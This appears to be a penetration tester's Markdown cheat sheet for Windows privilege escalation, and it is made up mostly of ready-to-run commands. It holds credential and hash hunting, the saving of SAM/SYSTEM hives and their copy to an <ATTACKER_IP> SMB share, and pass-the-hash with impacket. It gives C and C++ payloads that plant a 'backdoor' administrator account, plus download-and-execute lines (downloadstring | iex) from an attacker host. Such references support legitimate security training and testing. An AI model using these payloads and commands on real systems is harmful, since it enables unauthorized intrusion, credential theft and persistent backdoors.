# Windows Privilege Escalation Methodology

Comprehensive reference for Windows privilege escalation covering enumeration, service exploitation, DLL hijacking, scheduled tasks, registry mining, token manipulation, kernel exploits, credential extraction, and automated tooling.

---

## Enumeration and Situational Awareness

### Core System Information
```powershell
whoami
whoami /groups
whoami /priv
whoami /all
hostname
systeminfo
```

### User and Group Enumeration
```powershell
Get-LocalUser
net user
net user <username>
Get-LocalGroup
Get-LocalGroupMember administrators
net localgroup
net localgroup administrators
```

### Security Context
```powershell
# Check integrity level
whoami /groups | findstr "Mandatory Level"

# Access token information
whoami /all

# UAC status
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

### Network Information
```powershell
ipconfig /all
route print
netstat -ano
```

### Process and Service Enumeration
```powershell
Get-Process
tasklist /svc

# Services with binary paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Services with user context
Get-CimInstance Win32_Service -Filter "Name='<ServiceName>'" | Select-Object Name, State, StartName, ProcessId, PathName

# Specific service configuration
sc.exe qc <ServiceName>
sc.exe queryex <ServiceName>
```

### Installed Applications
```powershell
# 64-bit
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 32-bit
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

---

## Sensitive Information Hunting

### File System Search
```powershell
# Password files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Configuration files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue

# User documents
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### PowerShell Artifacts
```powershell
# PowerShell history
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Transcript files
Get-ChildItem -Path C:\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
```

### Registry Mining
```powershell
# Search for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

---

## Service Exploitation

### Service Binary Hijacking
```powershell
# Find running services with binary paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check binary permissions
icacls "C:\path\to\service.exe"

# Check service startup type
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'servicename'}

# Replace and restart
net stop servicename
net start servicename
shutdown /r /t 0
```

### DLL Hijacking
```powershell
# Check DLL permissions
icacls "C:\Program Files\Application\application.dll"

# Use Process Monitor (Procmon) to find missing DLLs
# Filter: Process Name is application.exe
# Look for: NAME NOT FOUND results for DLLs
```

### Unquoted Service Paths
```cmd
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check directory permissions
icacls "C:\Program Files\Vulnerable App\"
```

---

## Scheduled Tasks Abuse

### Task Enumeration
```cmd
schtasks /query /fo LIST /v
```
```powershell
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
```

### Task Analysis
```powershell
# Key fields: Run As User, Task To Run, Next Run Time, Author
# Check executable permissions
icacls "C:\path\to\scheduled\executable.exe"
```

---

## Dangerous Privileges

### Check for Exploitable Privileges
```powershell
whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege\|SeBackupPrivilege\|SeDebugPrivilege"
```

### Potato Family Exploits (SeImpersonatePrivilege)

| Tool | Target OS |
|------|-----------|
| JuicyPotato | Windows Server 2016/2019 |
| RoguePotato | Windows 10/11 |
| SweetPotato | Universal |
| SigmaPotato | Modern Windows |
| PrintSpoofer | Print Spooler service |

---

## Kernel Exploits

### Enumeration
```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

### Notable Kernel Exploits

| CVE | Name | Target |
|-----|------|--------|
| MS16-032 | Secondary Logon Handle | Windows 7/8/10, Server 2008-2012 |
| MS17-017 | GDI Palette Objects | Various |
| CVE-2021-1675 | PrintNightmare | Windows 10/11, Server 2019 |
| CVE-2023-29360 | Windows 11 | Windows 11 22H2 |

---

## Registry Operations and Hash Extraction

### Save Registry Hives
```cmd
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

### LocalAccountTokenFilterPolicy
```powershell
# Check current value (0 = filtering enabled, 1 = disabled)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy

# Disable UAC remote restrictions
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
```

### File Transfer via SMB
```bash
# Setup SMB server (attacker)
impacket-smbserver -smb2support share . -username user -password pass
```
```cmd
# Connect from Windows
net use Z: \\<ATTACKER_IP>\share /user:user pass
copy sam z:
copy system z:
```

### Hash Extraction and Pass-the-Hash
```bash
# Dump hashes from registry files
impacket-secretsdump -sam sam -system system local

# Pass-the-hash
impacket-psexec 'Administrator'@<TARGET_IP> -hashes :<NTLM_HASH>
impacket-wmiexec 'Administrator'@<TARGET_IP> -hashes :<NTLM_HASH>
```

---

## Payload Generation

### Malicious Service Binary (C)
```c
#include <stdlib.h>
int main() {
    system("net user backdoor Password123! /add");
    system("net localgroup administrators backdoor /add");
    return 0;
}
```

### Malicious DLL (C++)
```cpp
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user backdoor Password123! /add");
        system("net localgroup administrators backdoor /add");
    }
    return TRUE;
}
```

### Cross-Compilation
```bash
# Executable
x86_64-w64-mingw32-gcc payload.c -o payload.exe

# DLL
x86_64-w64-mingw32-gcc payload.cpp --shared -o payload.dll
```

---

## Automated Enumeration Tools

### WinPEAS
```powershell
iwr -uri http://<ATTACKER_IP>/winPEASx64.exe -OutFile winpeas.exe
.\winPEASx64.exe > winpeas.txt
type winpeas.txt
```

### Lazagne (Password Recovery)
```powershell
.\lazagne.exe all > lazagne.txt
type lazagne.txt
```

### PrivescCheck
```powershell
(new-object net.webclient).downloadstring("http://<ATTACKER_IP>/privesccheck.ps1") | iex
Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
```

### PowerUp
```powershell
iwr -uri http://<ATTACKER_IP>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Get-UnquotedService
Get-ModifiableScheduledTaskFile
```

### Seatbelt
```powershell
.\Seatbelt.exe -group=all
```

---

## Enumeration Scripts

### PowerShell One-Liners
```powershell
# Services outside C:\Windows (potential hijacking targets)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.PathName -notlike "C:\Windows\*"} | Format-Table -AutoSize

# Unquoted service paths
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*"'} | Select Name,PathName,StartName | Format-Table -AutoSize

# PowerShell history files
Get-ChildItem -Path "C:\Users\" -Include "ConsoleHost_history.txt" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "Found history: $($_.FullName)"; Get-Content $_.FullName }
```

### Registry Keys of Interest
```powershell
# AutoLogon, startup programs, services
$regKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($key in $regKeys) {
    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | Format-List
}
```

---

## File Transfer to Target
```powershell
iwr -uri http://<ATTACKER_IP>/<tool_name> -OutFile <output_filename>
```

---

## Quick Reference Tables

### Privilege Levels
| Level | Description | Access |
|-------|-------------|--------|
| Standard User | Limited privileges | User files, basic system info |
| Local Admin | Administrative rights | System files, services, registry |
| SYSTEM | Highest privilege | All system resources |

### Key Directories to Check
| Path | Look For |
|------|----------|
| `C:\Users\*\Documents` | Passwords, configs |
| `C:\Program Files\*` | Writable binaries |
| `C:\Windows\System32` | DLL hijacking |
| `C:\inetpub\wwwroot` | Web configs |

### Important Registry Keys
| Key | Purpose |
|-----|---------|
| `HKLM\...\Uninstall` | Installed software |
| `HKLM\...\Winlogon` | Auto-logon credentials |
| `HKLM\SYSTEM\CurrentControlSet\Services` | Service configurations |

---

## Methodology Summary

1. Run automated enumeration (WinPEAS, PowerUp, Seatbelt)
2. Check current privileges (`whoami /priv`) -- look for SeImpersonatePrivilege
3. Enumerate services -- writable binaries, unquoted paths, DLL hijacking
4. Check scheduled tasks for writable executables
5. Mine registry and file system for credentials
6. Check PowerShell history and transcript files
7. Extract registry hives for offline hash cracking
8. Search for kernel exploits as a last resort

---

## Resources

- LOLBAS Project: https://lolbas-project.github.io/
- Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Potato Exploits: https://github.com/ohpe/juicy-potato
